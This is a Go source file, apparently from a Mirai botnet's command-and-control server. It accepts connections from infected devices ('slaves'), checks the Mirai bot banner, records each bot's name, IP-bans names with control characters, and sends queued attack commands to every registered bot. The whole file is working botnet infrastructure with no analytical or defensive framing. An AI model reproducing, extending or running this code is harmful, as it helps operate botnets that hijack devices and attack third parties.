package slaves

import (
        "bytes"
        "log"
        "net"
        "strings"
)

func handle(conn net.Conn) {
        defer conn.Close()

        buf := make([]byte, 4)
        n, err := conn.Read(buf)
        if err != nil {
                log.Println(" [SLAVES] ["+err.Error()+"]")
                return
        }

        //Not a Mirai
        if bytes.Equal(buf[:n], []byte{0, 0, 0, 4}) == false {
                log.Println(" [SLAVES]", "[Incorrect connect banner. Client declined]")
                return
        }

        nameLength := make([]byte, 1)
        n, err = conn.Read(nameLength)
        if err != nil {
                log.Println(" [SLAVES] ["+err.Error()+"]")
                return
        }

        client := &Client{
                parent: clients,
                Conn:   conn,
        }

        if n == 1 && nameLength[0] > 0 {
                name := make([]byte, nameLength[0])
                n, err = conn.Read(name)
                if err != nil {
                        log.Println(" [SLAVES] ["+err.Error()+"]")
                        return
                }

                client.Name = string(name)

        }

        if strings.Contains(client.Name, "\x1b") || strings.Contains(client.Name, "\n") || strings.Contains(client.Name, "\r") || strings.Contains(client.Name, "\t") {
                log.Printf(" [Defacing attempt] [%s]\n", client.Conn.RemoteAddr())
                if IPBanDefaceAttempts {
                        if err := client.IPBan(); err != nil {
                                log.Println("slaves/handle.Deface:", err)
                                return
                        }

                        return
                }
        }

        if err := clients.Add(client); err != nil {
                log.Println(" [SLAVES] ["+err.Error()+"]")
                return
        }

        defer client.Remove()

        awaitCommands(client)
}

func awaitCommands(client *Client) {

        go func() {
                for {
                        data, open := <-client.Queue
                        if open == false {
                                return
                        }

                        _, err := client.Conn.Write(data)
                        if err != nil {
                                return
                        }
                }
        }()

        buf := make([]byte, 38)
        _, err := client.Conn.Read(buf)
        if err != nil {
                return
        }
}
